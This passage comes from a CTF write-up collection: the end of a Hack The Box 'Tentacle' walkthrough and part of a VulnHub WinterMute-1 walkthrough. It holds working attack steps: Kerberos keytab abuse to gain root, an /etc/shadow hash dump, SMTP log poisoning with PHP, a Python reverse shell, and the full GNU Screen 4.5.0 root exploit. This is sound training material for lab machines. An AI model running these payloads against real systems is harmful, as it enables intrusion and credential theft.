account        realcorp
host           127.0.0.1
port           587
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM>6Z~64_
tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60

# Set a default account
account default : realcorp
```

Quickly got creds 😀 that’s located in /home/j.nakazawa

but sadly can’t able to ssh with it 😦 need to use kerbos to generate a ticket and use that ticket to log in as the user, let’s do that

Make sure installed that, If not then do it with the below commands

``` bash
apt-get install krb5-user
```

then modify /etc/hosts and /etc/krb5.conf files

``` bash
10.10.10.224    srv01.realcorp.htb
```

make sure have this host in /etc/hosts file

``` bash
default_realm = REALCORP.HTB

REALCORP.HTB = {
        kdc = 10.10.10.224
        }
```

and add this on /etc/krb5.conf file

then going to generate the ticket

``` bash
──(root💀kali)-[~/hackthebox/machine/tentacle]
└─# kinit j.nakazawa
Password for j.nakazawa@REALCORP.HTB:
```

use this to generate the ticket, it asks for password, Enter the password that we got above in /home/j.nakazawa folder

``` bash
┌──(root💀kali)-[~/hackthebox/machine/tentacle]
└─# klist
Ticket cache: FILE:/tmp/krb5cc_0
Default principal: j.nakazawa@REALCORP.HTB

Valid starting       Expires              Service principal
2021-01-30T22:12:34  2021-01-31T22:10:00  krbtgt/REALCORP.HTB@REALCORP.HTB
```

use this commands to check the available tickets

There you go simply log in, this time it won’t asks password. If it asks for password you done a mistake anywhere 😦 correct it and try again

``` bash
┌──(root💀kali)-[~/hackthebox/machine/tentacle]
└─# ssh j.nakazawa@10.10.10.224
The authenticity of host '10.10.10.224 (10.10.10.224)' can't be established.
ECDSA key fingerprint is SHA256:eWzMB5HoqVH++9udWLB4bYS/8KguhJxNZPtZ3JLc3oo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.224' (ECDSA) to the list of known hosts.
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Thu Dec 24 06:02:06 2020 from 10.10.14.2
[j.nakazawa@srv01 ~]$ id
uid=1000(j.nakazawa) gid=1000(j.nakazawa) 组=1000(j.nakazawa),23(squid),100(users) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[j.nakazawa@srv01 ~]$ whoami
j.nakazawa
[j.nakazawa@srv01 ~]$ ls
user.txt
[j.nakazawa@srv01 ~]$ cat user.txt
3e644f8b453a335ba99548e35919b78e
```

Good here we logged as j.nakazawa fastly grab the user.txt and follow my steps, here after it’s a headache to go forward

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb172.jpg)


#### PRIVESC TO ADMIN

``` bash
[j.nakazawa@srv01 ~]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
* * * * * admin /usr/local/bin/log_backup.sh
```

fine while seeing the crontab there’s a file running named “log_backup.sh”, let’s view it 🙂

``` bash
[j.nakazawa@srv01 ~]$ cat /usr/local/bin/log_backup.sh
#!/bin/bash

/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
cd /home/admin
/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
/usr/bin/rm -f access.log cache.log
```

It backups everything from /var/log/squid to /home/admin

So if we put something in that squid folder then it’ll be copied to admin’s folder, fine now let’s create a log in file then we can log as admin coz it copied to that admin’s folder

now create a file named .k5login

``` bash
[j.nakazawa@srv01 ~]$ echo "j.nakazawa@REALCORP.HTB" > .k5login
[j.nakazawa@srv01 ~]$ ls -la
总用量 20
drwxr-x---. 2 j.nakazawa j.nakazawa 131 1月  31 03:22 .
drwxr-xr-x. 4 root       root        37 11月  3 15:22 ..
lrwxrwxrwx. 1 root       root         9 12月  9 08:26 .bash_history -> /dev/null
-rw-r--r--. 1 j.nakazawa j.nakazawa  18 11月  8 2019 .bash_logout
-rw-r--r--. 1 j.nakazawa j.nakazawa 141 11月  8 2019 .bash_profile
-rw-r--r--. 1 j.nakazawa j.nakazawa 312 11月  8 2019 .bashrc
-rw-rw-r--. 1 j.nakazawa j.nakazawa  24 1月  31 03:22 .k5login
lrwxrwxrwx. 1 root       root         9 12月  9 12:30 .lesshst -> /dev/null
-r--------. 1 j.nakazawa j.nakazawa  33 1月  31 01:12 user.txt
[j.nakazawa@srv01 ~]$ cat .k5login
j.nakazawa@REALCORP.HTB
```

``` bash
cp .k5login /var/log/squid
```

then copy this file to /var/log/squid folder. can’t able to go to that folder (permissions denied) but we can copy this file there, so do that

``` bash
┌──(root💀kali)-[~]
└─# ssh admin@srv01.realcorp.htb
The authenticity of host 'srv01.realcorp.htb (10.10.10.224)' can't be established.
ECDSA key fingerprint is SHA256:eWzMB5HoqVH++9udWLB4bYS/8KguhJxNZPtZ3JLc3oo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'srv01.realcorp.htb' (ECDSA) to the list of known hosts.
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Sun Jan 31 03:27:01 2021
[admin@srv01 ~]$ id
uid=1011(admin) gid=1011(admin) 组=1011(admin),23(squid) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[admin@srv01 ~]$ whoami
admin
[admin@srv01 ~]$ ls
squid_logs.tar.gz.2021-01-31-032501  squid_logs.tar.gz.2021-01-31-032601  squid_logs.tar.gz.2021-01-31-032701
```

after doing that try to log in as admin (try 2~3 times) some times it takes time to copy that log in file

#### ADMIN TO ROOT

fine now we’re admin after enuming some time this file seems interesting “krb5.keytab” it’s located in /etc folder.

``` bash
[admin@srv01 ~]$ klist -k /etc/krb5.keytab
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
```

So what’s a keytab file?

A keytab is a file containing pairs of Kerberos principals and encrypted keys (which are derived from the Kerberos password). You can use a keytab file to authenticate to various remote systems using Kerberos without entering a password.

note that bolded text now we’re going to do that 😀

``` bash
kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
```

run this

``` bash
add_principal root@REALCORP.HTB
```

then the kadmin’s console tab will open, add this principle into it

``` bash
[admin@srv01 ~]$ kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
Couldn't open log file /var/log/kadmind.log: Permission denied
Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.
kadmin:  add_principal root@REALCORP.HTB
No policy specified for root@REALCORP.HTB; defaulting to no policy
Enter password for principal "root@REALCORP.HTB": 
Re-enter password for principal "root@REALCORP.HTB": 
Principal "root@REALCORP.HTB" created.
```

Then it ask’s to create password, create a password there then exit that kadmin’s console, just type exit

``` bash
[admin@srv01 ~]$ ksu root
WARNING: Your password may be exposed if you enter it here and are logged 
         in remotely using an unsecure (non-encrypted) channel. 
Kerberos password for root@REALCORP.HTB: : 
Authenticated root@REALCORP.HTB
Account root: authorization for root@REALCORP.HTB successful
Changing uid to root (0)
[root@srv01 admin]# id
uid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@srv01 admin]# whoami
root
[root@srv01 admin]# cd
[root@srv01 ~]# ls
anaconda-ks.cfg  Linux_release_checklist.sh  root.txt
[root@srv01 ~]# cat root.txt
9b46410371881ac43708ca604eb10aab
```

then type ksu root and it ask’s for password just type the password that you’ve created above in kadmin’s console 😀

``` bash
[root@srv01 ~]# cat /etc/shadow
root:$6$2ZKaulGjQ1QUYQHO$OmVJBK0.VeikBcOsxyrLfPCEkrfo6S8SJmHd4FH7el9vHcduJrO7jHYEHjIN7Z4n1c3KBLNe5L9inXSgeBsNS.:18605:0:99999:7:::
bin:*:18358:0:99999:7:::
daemon:*:18358:0:99999:7:::
adm:*:18358:0:99999:7:::
lp:*:18358:0:99999:7:::
sync:*:18358:0:99999:7:::
shutdown:*:18358:0:99999:7:::
halt:*:18358:0:99999:7:::
mail:*:18358:0:99999:7:::
operator:*:18358:0:99999:7:::
games:*:18358:0:99999:7:::
ftp:*:18358:0:99999:7:::
nobody:*:18358:0:99999:7:::
dbus:!!:18602::::::
systemd-coredump:!!:18602::::::
systemd-resolve:!!:18602::::::
tss:!!:18602::::::
polkitd:!!:18602::::::
libstoragemgmt:!!:18602::::::
cockpit-ws:!!:18602::::::
cockpit-wsinstance:!!:18602::::::
sssd:!!:18602::::::
sshd:!!:18602::::::
chrony:!!:18602::::::
rngd:!!:18602::::::
unbound:!!:18602::::::
squid:!!:18602::::::
named:!!:18602::::::
nginx:!!:18602::::::
j.nakazawa:$6$W68LBvOuL0H13AqJ$G4JdGleMyHdzvBmpcV7JiLupa3bosgxHj.aUfxcydXIODXuepjj6uUIQ/5E2THv2sf5Qhp7qtBIEu4kmNl2pU1:18604:0:99999:7:::
admin:!!:18605:0:99999:7:::
setroubleshoot:!!:18620::::::
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb173.jpg)

#### Summary of knowledge

 - usage of proxychains
 - dnsenum fuzz subdomains
 - OpenSMTPD Remote code execution
 - use kerbos to generate ticket
 - use crontab to copy files
 - use keytab file to authenticate to various remote systems using Kerberos without entering a password to get root

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end tentacle -->

</details>

<a id="case-wintermute-1"></a>

## 双主机网络与 LXD 边界

Straylight 与 Neuromancer 的网络隔离要求分层转发。原文保留 Struts、TTY、SSH 和 LXD 的两台主机路线与替代提权方法。

<p class="kb-provenance">来源 WinterMute-1 · 原记录 2020-01-13 · 72 个代码块 · 17 处图片引用</p>

<details class="kb-evidence" id="record-wintermute-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start WinterMute-1 -->

#### 名称
名称：WinterMute: 1
发布日期：2018年7月5日

#### 下载
 - Download: https://drive.google.com/open?id=1bHgdx0iI24jv7MDzKcrIPtd9rVFaVokR
 - Download (Mirror): https://download.vulnhub.com/wintermute/Wintermute-v1.zip
 - Download (Torrent): https://download.vulnhub.com/wintermute/Wintermute-v1.zip.torrent



#### 描述
一个新的OSCP风格实验室，涉及2台易受攻击的机器，以赛博朋克经典Neuromancer为主题-任何网络安全爱好者都必须阅读。该实验室利用了数据透视和后期开发，而我发现其他OSCP预处理实验室似乎缺乏。目标是在两台计算机上都root。您只需要默认的Kali Linux。

我将其评为“中级”。没有缓冲区溢出或漏洞利用开发-可以使用小的字典进行任何必要的密码破解。它与OSCP盒而不是CTF更为相关。我已经测试了很多，但是如果您发现任何问题或需要在这里微调我。

压缩下载中包含Virtual Box Lab的安装说明，但是这里有一个简短的摘要：Straylight-模拟带有2个NICS的面向公众的服务器。首先盖上此盖，然后转到最后一台机器。Neuromancer-在具有1个NIC的非公共网络中。您的Kali框应仅与Straylight位于同一虚拟网络上。需要VirtualBox。VMware无法正确导入。

#### 网络配置

Wintermute Vitrual Box设置指南本练习利用了数据透视，因此需要正确设置VirtualBox网络。所有动态ip都快速简便。运行或将每台计算机导入Virtual Box（文件>>导入设备）

STRAYLIGHT（网络＃1和＃2）-这是第一台获得root权限的计算机。
- Adapter 1 
	- Host-only Adapter
	- VirtualBox Host-Only Ethernet Adapter #1
	Advanced (we want 2 NIC's, each on a separate network)
	- Adapter Type - Intel PRO/1000 T Server 
- Adapter 2
	- Host-only Adapter
	- VirtualBox Host-Only Ethernet Adapter #2
	Advanced
	- Adapter Type - Intel PRO/1000 MT Desktop (or other adapter type different than network #1).

NEUROMANCER（网络2）-这是获得root的最终机器。设置为具有1个网络。仅通过Straylight使用仅限主机的Eth适配器＃2访问。
- Adapter 1
	- Host-only Adapter
	- VirtualBox Host-Only Ethernet Adapter #2
	Advanced
	- Adapter Type - Intel PRO/1000 MT Desktop

KALI（网络＃1）-您的攻击机器仅应在仅主机的适配器上设置，Straylight处于打开状态，如果选择，则为NAT。-您不应该从Kali盒中对Neuromancer进行ping操作。如果可以的话，你在作弊。

- Adapter 1
	- Host-only Adapter
	- VirtualBox Host-Only Ethernet Adapter #1

![](https://www.baslub.nl/wp-content/uploads/2019/01/Network-setup-768x332.png)

网络这样设置以便于通关了STRAYLIGHT之后，再通关NEUROMANCER

#### Wintermute-Straylight

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.56.0/24
Nmap scan report for 192.168.56.111
Host is up (0.00011s latency).
MAC Address: 08:00:27:50:96:D9 (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -p- -sV -Pn -T5 -v -A --script=vuln 192.168.56.111
PORT     STATE SERVICE VERSION
25/tcp   open  smtp    Postfix smtpd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
| ssl-dh-params: 
|   VULNERABLE:
|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use anonymous
|       Diffie-Hellman key exchange only provide protection against passive
|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
|       which could completely compromise the confidentiality and integrity
|       of any data exchanged over the resulting session.
|     Check results:
|       ANONYMOUS DH GROUP 1
|             Cipher Suite: TLS_DH_anon_WITH_AES_256_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 2048
|             Generator Length: 8
|             Public Key Length: 2048
|     References:
|_      https://www.ietf.org/rfc/rfc2246.txt
|_sslv2-drown: 
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|_  /manual/: Potentially interesting folder
|_http-server-header: Apache/2.4.25 (Debian)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
3000/tcp open  http    Mongoose httpd
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.111
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.111:3000/
|     Form id: 
|_    Form action: /authorize.html
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)
|_http-passwd: ERROR: Script execution failed (use -d to debug)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trane-info: Problem with XML parsing of /evox/about
| http-vuln-cve2010-0738: 
|_  /jmx-console/: Authentication was not required
```

访问80端口

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub156.jpg)

访问3000端口

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub157.jpg)

发现下方有提示说用户密码都是admin，然后直接登录

``` bash
Hint: the default user and password are admin
```
发现有一些目录

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub158.jpg)

然后访问http://192.168.56.111/turing-bolo/

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub159.jpg)

点击之后显示如下

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub160.jpg)

从上面的屏幕截图中，可以看到一些日志文件（突出显示）。根据经验，目录遍历，可以在浏览器中执行可写文件。因此，尝试将../../../log/mail附加到浏览器中的URL，如下所示：

``` bash
http://192.168.56.111//turing-bolo/bolo.php?bolo=../../../log/mail
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub161.jpg)

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub162.jpg)

使用下面的url也可以

``` bash
http://192.168.56.111//turing-bolo/bolo.php?bolo=/var/log/mail
```

#### getshell

有用。现在，让尝试使用telnet发送恶意邮件。在邮件主题中包括一些php代码。

``` bash
root@kali:~# telnet 192.168.56.111 25
Trying 192.168.56.111...
Connected to 192.168.56.111.
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
HELO hack.com
250 straylight
MAIL FROM: hacker@hack.com
250 2.1.0 Ok
RCPT TO: wintermute@localhost.com
454 4.7.1 <wintermute@localhost.com>: Relay access denied
RCPT TO: wintermute
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
subject: <?php system($_REQUEST['luci']); ?>
hacked!!
.
250 2.0.0 Ok: queued as EC8E454D7
quit
221 2.0.0 Bye
Connection closed by foreign host.
```

现在再次包含mail.log文件，但是这次发送第二个GET参数luci，该参数将执行我们的命令。

``` bash
http://192.168.56.111//turing-bolo/bolo.php?bolo=/var/log/mail&luci=id
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub163.jpg)

可以看到成功执行命令，现在构造以下的poc以获得一个reverse shell

``` bash
http://192.168.56.111/turing-bolo/bolo.php?bolo=/var/log/mail&luci=python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.56.102',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```
可以看到kali端成功弹回了shell

``` bash
root@kali:~# nc -lvp 9999
listening on [any] 9999 ...
192.168.56.109: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.109] 48508
bash: cannot set terminal process group (771): Inappropriate ioctl for device
bash: no job control in this shell
www-data@straylight:/var/www/html/turing-bolo$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@straylight:/var/www/html/turing-bolo$ whoami
whoami
www-data
```
#### 提权

查看是否有可提权的SUID文件

``` bash
www-data@straylight:/var/www/html/turing-bolo$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/bin/su
/bin/umount
/bin/mount
/bin/screen-4.5.0
/bin/ping
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
```

在screen-4.5.0上运行searchsploit将返回漏洞，以提升权限，完美！

``` bash
root@kali:~# searchsploit screen 4.5
-------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                |  Path
                                                              | (/usr/share/exploitdb/)
-------------------------------------------------------------- ----------------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                 | exploits/linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)           | exploits/linux/local/41152.txt
-------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

看一下exp的源码

``` bash
root@kali:~# cat /usr/share/exploitdb/exploits/linux/local/41154.sh
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
/tmp/rootshellr
```

运行以下sed命令将脚本格式换行和缩进转化一下，脚本才能正常运行

``` bash
root@kali:~/41154# sed -i -e 's/\r$//' 41154.sh
```

``` bash
root@kali:~/41154# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

转换为tty标准的shell

``` bash
python -c "import pty;pty.spawn('/bin/bash')"
```

如下成功运行脚本，成功提权，帅爆了。。。

``` bash
www-data@straylight:/var/www/html/turing-bolo$ wget http://192.168.56.102:8000/41154.sh
<ring-bolo$ wget http://192.168.56.102:8000/41154.sh
--2020-01-15 01:30:12--  http://192.168.56.102:8000/41154.sh
Connecting to 192.168.56.102:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1151 (1.1K) [text/x-sh]
Saving to: '41154.sh'

41154.sh            100%[===================>]   1.12K  --.-KB/s    in 0s      

2020-01-15 01:30:12 (415 MB/s) - '41154.sh' saved [1151/1151]

www-data@straylight:/var/www/html/turing-bolo$ chmod 777 *
chmod 777 *
www-data@straylight:/var/www/html/turing-bolo$ ls
ls
41154.sh      bolo.css  c7.png    css         molly.log    ta.png
armitage.log  bolo.php  case.log  index.html  riviera.log
www-data@straylight:/var/www/html/turing-bolo$ ./41154.sh
./41154.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function 'dropshell':
/tmp/libhax.c:7:5: warning: implicit declaration of function 'chmod' [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^~~~~
/tmp/rootshell.c: In function 'main':
/tmp/rootshell.c:3:5: warning: implicit declaration of function 'setuid' [-Wimplicit-function-declaration]
     setuid(0);
     ^~~~~~
/tmp/rootshell.c:4:5: warning: implicit declaration of function 'setgid' [-Wimplicit-function-declaration]
     setgid(0);
     ^~~~~~
/tmp/rootshell.c:5:5: warning: implicit declaration of function 'seteuid' [-Wimplicit-function-declaration]
     seteuid(0);
     ^~~~~~~
/tmp/rootshell.c:6:5: warning: implicit declaration of function 'setegid' [-Wimplicit-function-declaration]
     setegid(0);
     ^~~~~~~
/tmp/rootshell.c:7:5: warning: implicit declaration of function 'execvp' [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^~~~~~
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# whoami
whoami
root
```

读取flag

``` bash
# cd /root
cd /root
# ls
ls
flag.txt  note.txt  scripts
# cat note.txt
cat note.txt
Devs,

Lady 3Jane has asked us to create a custom java app on Neuromancer's primary server to help her interact w/ the AI via a web-based GUI.

The engineering team couldn't strss enough how risky that is, opening up a Super AI to remote access on the Freeside network. It is within out internal admin network, but still, it should be off the network completely. For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can do.

Anyways, we've deployed the war file on tomcat as ordered - located here:

/struts2_2.3.15.1-showcase

It's ready for the devs to customize to her liking...I'm stating the obvious, but make sure to secure this thing.

Regards,

Bob Laugh
Turing Systems Engineer II
Freeside//Straylight//Ops5
# cat flag.txt
cat flag.txt
5ed185fd75a8d6a7056c96a436c6d8aa
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub164.jpg)

winterMute第一部分到此结束

 - 总结：
 1.弱口令
 2.文件包含
 3.telnet发送恶意邮件写shell
 4.python reverse shell
 5.Screen 4.5.0本地提权
 6.用(sed -i -e 's/\r$//')将exp换行和缩进和格式变得可执行

#### Wintermute-Neuromancer

之前的note.txt向显示一个可能的网络目录。但是，当不知道Neuromancer上的哪些端口打开时，这是没有用的。查看Straylight的arp表将告诉我们Neuromancer的地址，即192.168.56.110。

``` bash
# arp -a
arp -a
? (192.168.56.102) at 00:0c:29:70:75:41 [ether] on enp0s8
? (192.168.56.110) at 08:00:27:de:b9:3d [ether] on enp0s8
? (192.168.56.1) at 0a:00:27:00:00:19 [ether] on enp0s8
? (192.168.56.100) at 08:00:27:25:3d:8a [ether] on enp0s8
```

``` bash
# ifconfig
ifconfig
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.111  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::a00:27ff:fe50:96d9  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:50:96:d9  txqueuelen 1000  (Ethernet)
        RX packets 771  bytes 65226 (63.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 21  bytes 2052 (2.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.109  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::a00:27ff:fea9:7af0  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:a9:7a:f0  txqueuelen 1000  (Ethernet)
        RX packets 197671  bytes 11899335 (11.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 197077  bytes 14611455 (13.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 415522  bytes 33365253 (31.8 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 415522  bytes 33365253 (31.8 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

也可以写一个脚本探测存活的主机

``` bash
#!/bin/bash

for ip in $(seq 1 254); do
   ping -c 1 192.168.56.$ip | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &
done
```

``` bash
# ./pingsweep.sh
./pingsweep.sh
192.168.56.100
192.168.56.102
192.168.56.111
192.168.56.110
192.168.56.109
```

其中192.168.56.102是kali的ip，192.168.56.109，和192.168.56.111都是Straylight的ip，192.168.56.100是vbox Host-only Adapter网卡的网关地址，剩下的192.168.56.110就是Neuromancer机器的ip地址。

使用nc扫描端口

``` bash
# for i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.110 $i 2>&1; done | grep -v "Connection refused"
for i in $(seq 1 65535); do nc -nvz -w 1 192.168.56.110 $i 2>&1; done | grep -v "Connection refused"
(UNKNOWN) [192.168.56.110] 8009 (?) open
(UNKNOWN) [192.168.56.110] 8080 (http-alt) open
(UNKNOWN) [192.168.56.110] 34483 (?) open
```

这里有三个开放的端口8009、8080和34483，但是问题是，如果尝试访问IP和端口，将看不到任何内容。为了能够加入它们，必须进行端口转发。对于端口转发，可以使用socat之类的socat，如socat TCP-LISTEN：5000,fork,reuseaddr tcp：127.0.0.1：8080，这意味着8080上的网站应该在外部的5000端口上可见。但是，由于需要处理三个端口，必须在每个命令的末尾加上＆。＆in nix告诉系统执行命令并将其置于后台。简而言之，将执行以下命令。

``` bash
# socat TCP-LISTEN:8009,fork,reuseaddr tcp:192.168.56.110:8009 &
socat TCP-LISTEN:8009,fork,reuseaddr tcp:192.168.56.110:8009 &
# socat TCP-LISTEN:8000,fork,reuseaddr tcp:192.168.56.110:8080 &
socat TCP-LISTEN:8000,fork,reuseaddr tcp:192.168.56.110:8080 &
# socat TCP-LISTEN:34483,fork,reuseaddr tcp:192.168.56.110:34483 &
socat TCP-LISTEN:34483,fork,reuseaddr tcp:192.168.56.110:34483 &
```

然后上nmap

``` bash
root@kali:~# nmap -sV -v -p 8009,8080,34483 -Pn -A --script=vuln 192.168.56.110
PORT      STATE SERVICE VERSION
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
8080/tcp  open  http    Apache Tomcat 9.0.0.M26
